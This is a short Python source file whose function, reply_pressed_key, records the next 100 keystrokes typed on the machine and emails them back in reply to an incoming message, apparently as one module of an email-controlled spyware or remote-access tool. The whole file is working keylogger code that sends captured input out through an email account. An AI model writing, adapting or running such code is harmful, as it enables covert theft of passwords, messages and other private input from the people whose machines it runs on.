import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from my_utils import finish_and_send

def reply_pressed_key(original_email, USERNAME, PASSWORD):
    cnt, catched = 0, []
    while True:
        cur = keyboard.read_key()
        cnt += 1
        catched.append(str(cur))
        if cnt == 100:
            break
    catched = ' '.join(catched)
    catched = 'Latest 100 characters:\n' + catched

    rep = MIMEMultipart('mixed')
    rep.attach(MIMEText(catched))
    finish_and_send(rep, original_email, USERNAME, PASSWORD)